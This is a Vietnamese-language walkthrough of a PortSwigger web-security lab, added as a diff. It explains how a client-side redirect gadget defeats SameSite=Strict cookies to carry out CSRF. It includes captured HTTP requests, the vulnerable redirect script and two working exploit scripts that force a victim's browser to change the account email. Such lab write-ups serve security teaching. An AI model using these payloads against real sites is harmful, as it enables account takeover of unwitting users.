@@ -1,0 +1,69 @@
+CSRF - SameSite Strict bypass via client-side redirect
+
+End Goal: To solve the lab, perform a CSRF attack that changes the victim's email address. You should use the provided exploit server to host your attack.
+You can log in to your own account using the following credentials: wiener:peter
+
+Analystic
+---------
+* Nghiên cứu chức năng thay đổi email
+Trong trình duyệt burp, đăng nhập vào tài khoản và thực hiện thay đổi email. Vào history , tìm request khi thực hiện change email, ta có request như sau:
+POST /my-account/change-email HTTP/2
+Host: 0a03001e03bc118d80aea803004e0079.web-security-academy.net
+Cookie: session=8USsGM9rxNTokDx5EqHz4TT7HQPWBAUs
+.....
+email=tmt2%40gmail.com&submit=1
+Yêu cầu này không chứa bất kỳ mã csrf nào, do đó có thể bị csrf nếu bạn bỏ qua bất kỳ hạn chế cookie SameSite nào.
+
+Xem phản hồi cho /login, ta có:
+HTTP/2 302 Found
+Location: /my-account?id=wiener
+Set-Cookie: session=8USsGM9rxNTokDx5EqHz4TT7HQPWBAUs; Secure; HttpOnly; SameSite=Strict
+X-Frame-Options: SAMEORIGIN
+Content-Length: 0
+trang web chỉ định rõ ràng SameSite=Strictkhi thiết lập cookie phiên. Điều này ngăn trình duyệt đưa các cookie này vào yêu cầu liên trang web.
+
+* Xác định 1 tiện ích phù hợp:
+- Trong trình duyệt, hãy đến một trong các bài đăng trên blog và đăng một bình luận tùy ý. Lưu ý rằng ban đầu bạn sẽ được chuyển đến trang xác nhận /post/comment/confirmation?postId=xnhưng sau vài giây, bạn sẽ được đưa trở lại bài đăng trên blog.
+- Trong Burp, hãy vào lịch sử proxy và lưu ý rằng chuyển hướng này được xử lý ở phía máy khách bằng cách sử dụng tệp JavaScript đã nhập /resources/js/commentConfirmationRedirect.js. Đọc response cho nó ta có:
+HTTP/2 200 OK
+Content-Type: application/javascript; charset=utf-8
+Cache-Control: public, max-age=3600
+X-Frame-Options: SAMEORIGIN
+Content-Length: 231
+
+redirectOnConfirmation = (blogPath) => {
+    setTimeout(() => {
+        const url = new URL(window.location);
+        const postId = url.searchParams.get("postId");
+        window.location = blogPath + '/' + postId;
+    }, 3000);
+}
+ở đây ta thấy nó sử dụng giá trị của tham số postId để tạo liên kết động cho web 
+- Trong lịch sử proxy, nhấp chuột phải vào GET /post/comment/confirmation?postId=xyêu cầu và chọn Sao chép URL .
+- Trong trình duyệt, hãy truy cập URL này nhưng hãy thay đổi postIdtham số thành một chuỗi tùy ý:
+/post/comment/confirmation?postId=foo
+- Lưu ý rằng ban đầu bạn sẽ thấy trang xác nhận bài đăng trước khi JavaScript phía máy khách cố gắng chuyển hướng bạn đến đường dẫn chứa chuỗi đã chèn của bạn, ví dụ: /post/foo.
+- Hãy thử chèn một chuỗi đường dẫn chuyển hướng để URL chuyển hướng được xây dựng động sẽ trỏ đến trang tài khoản của bạn:
+/post/comment/confirmation?postId=1/../../my-account
+- Lưu ý rằng trình duyệt chuẩn hóa URL này và đưa bạn đến trang tài khoản của mình thành công. Điều này xác nhận rằng bạn có thể sử dụng postIdtham số để tạo GETyêu cầu cho điểm cuối tùy ý trên trang web mục tiêu
+
+* Bỏ qua các hạn chế của SameSite
+- Trong trình duyệt, hãy đến máy chủ khai thác và tạo một tập lệnh khiến trình duyệt của người xem gửi GETyêu cầu bạn vừa kiểm tra. Sau đây là một cách tiếp cận khả thi:
+<script>
+    document.location = "https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=../my-account";
+</script>
+- Tự lưu trữ và xem bản khai thác.
+Lưu ý rằng khi chuyển hướng phía máy khách diễn ra, bạn vẫn kết thúc ở trang tài khoản đã đăng nhập của mình. Điều này xác nhận rằng trình duyệt đã bao gồm cookie phiên đã xác thực của bạn trong yêu cầu thứ hai, mặc dù yêu cầu gửi bình luận ban đầu được khởi tạo từ một trang web bên ngoài tùy ý.
+
+* Tạo 1 khai thác 
+- Gửi POST /my-account/change-emailyêu cầu tới Burp Repeater.
+- Trong Burp Repeater, nhấp chuột phải vào yêu cầu và chọn Thay đổi phương thức yêu cầu . Burp tự động tạo một GETyêu cầu tương đương.
+- Gửi yêu cầu. Lưu ý rằng điểm cuối cho phép bạn thay đổi địa chỉ email bằng cách sử dụng GETyêu cầu.
+- Quay lại máy chủ khai thác và thay đổi postIdtham số trong khai thác của bạn để lệnh chuyển hướng khiến trình duyệt gửi GETyêu cầu tương đương để thay đổi địa chỉ email của bạn:
+<script>
+    document.location = "https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1";
+</script>
+Lưu ý rằng bạn cần bao gồm submittham số và URL mã hóa dấu phân cách dấu thăng để tránh làm hỏng tham postIdsố trong yêu cầu thiết lập ban đầu.
+- Hãy tự mình kiểm tra lỗ hổng và xác nhận rằng bạn đã thay đổi địa chỉ email thành công.
+- Thay đổi địa chỉ email trong phần khai thác sao cho nó không trùng với địa chỉ email của bạn
+- Gửi mã khai thác cho nạn nhân. Sau vài giây, phòng thí nghiệm sẽ được giải quyết.
